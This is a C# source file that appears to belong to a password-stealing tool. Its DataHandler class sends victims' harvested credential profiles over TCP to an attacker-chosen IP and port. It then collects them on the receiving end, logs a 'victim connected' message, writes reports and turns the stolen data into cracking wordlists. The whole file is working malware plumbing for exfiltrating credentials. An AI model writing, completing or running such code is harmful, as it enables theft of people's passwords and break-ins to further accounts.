using PS03.PostOperations;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace PS03.HandleData
{
    public class DataHandler
    {
        CommandLineOptions.Options _options;
        List<Profile> _allProfiles = new List<Profile>();
        IPacker packer = new PasswordPacker();
        Mutex mtx = new Mutex();
        WordlistGenerator wg = new WordlistGenerator();

        public DataHandler(CommandLineOptions.Options options)
        {
            _options = options;
        }
        public void Send(int port, string ip, List<Profile> data)
        {

            INetworkHandler networkhandler = new TCPNetworkHandler(ip, port);
            data.Add(new Profile { AppName = "LAST"});

            foreach (var targetdata in data)
            {       
                networkhandler.Send(packer.Pack(targetdata));
            }
        }

        public void HandleReceivedData(object sender, string s)
        {
            mtx.WaitOne();
            Profile cleanprofile = new Profile();
            try
            {
                cleanprofile = packer.Unpack(s);
                if (cleanprofile.AppName == "LAST")
                    Print(_allProfiles, new ConsolePrinter(), new ConsoleFormatter());
                else _allProfiles.Add(cleanprofile);

            }
            catch (Exception)
            {
                Console.WriteLine("Error in decrypting data..");
            }

            mtx.ReleaseMutex();
        }

        public void HandleVictimConected(object sender, string s)
        {
            Console.WriteLine("Victim connected from: " + s);
        }


        public void Print(List<Profile> data, IPrinter printer, DataFormatter formatter)
        {
            if(_options.Verbose)
                printer.Print(formatter.Format(data));
            if(_options.Log)
            {
                printer = new FilePrinter();
                formatter = new ReportFormatter();

                printer.Print(formatter.Format(data));
                wg.Generate(data);
            }

        }
    }
}
